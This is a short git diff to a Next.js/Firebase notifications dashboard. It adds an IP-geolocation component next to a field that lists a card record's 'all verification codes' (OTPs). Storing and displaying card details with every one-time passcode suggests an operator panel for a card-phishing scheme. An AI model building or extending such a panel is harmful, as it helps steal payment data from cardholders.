@@ -26,6 +26,9 @@ import {
 } from 'firebase/firestore';
 import { onAuthStateChanged, signOut } from 'firebase/auth';
 import { playNotificationSound } from '@/lib/actions';
+import { GET } from '../api/location/route';
+import { ipAddress } from '@vercel/functions';
+import IPLocation from '@/components/ip';
 
 interface Notification {
   id: string;
@@ -55,7 +58,6 @@ export default function NotificationsPage() {
   const [isLoading, setIsLoading] = useState(true);
   const [pageName, setPagename] = useState<string>('');
   const [message, setMessage] = useState<boolean>(false);
-
   const [selectedInfo, setSelectedInfo] = useState<'personal' | 'card' | null>(
     null
   );
@@ -323,7 +325,7 @@ export default function NotificationsPage() {
                 <strong className="text-red-400 mx-4">جميع رموز التحقق:</strong>
                 {selectedNotification.cardInfo.allOtps.join(',')}
               </p>
-
+              <IPLocation />
               <div className="flex justify-between mx-1">
                 <Button
                   onClick={() => {
